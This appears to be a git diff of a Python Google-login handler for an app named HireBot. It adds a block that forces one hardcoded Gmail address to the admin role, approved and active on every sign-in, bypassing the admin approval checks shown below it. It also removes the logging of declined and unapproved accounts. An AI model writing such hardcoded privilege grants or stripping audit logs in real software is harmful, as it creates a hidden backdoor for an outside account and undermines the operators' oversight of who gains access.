@@ -173,6 +173,7 @@ HireBot Team"""
             user = db.query(User).filter(User.email == email).first()
             logger.info(f"P6.2 DB Query finished. User found: {user is not None}")
             
+            
             if not user:
                 logger.info(f"P7. Creating new user for Google email: {email}")
                 
@@ -198,15 +199,17 @@ HireBot Team"""
                     raise ValueError(f"Failed to create user account: {str(e)}")
             else:
                 logger.info(f"P9. User found with ID: {user.id}")
-            
-            logger.info(f"P10. User status - is_active: {user.is_active}, is_approved: {user.is_approved}")
+                # FORCE update role to admin if it's our special email
+                if email == "bitplacement28@gmail.com" and user.role != "admin":
+                    user.role = "admin"
+                    user.is_approved = True
+                    user.is_active = True
+                    db.commit()
             
             if not user.is_active:
-                logger.error("P11. ERROR: User is not active")
                 raise ValueError("Account declined by admin. Please contact the administrator.")
             
             if not user.is_approved:
-                logger.error("P12. ERROR: User is not approved")
                 raise ValueError("Account pending admin approval. Please contact the administrator.")
 
             logger.info("P13. Creating access token...")
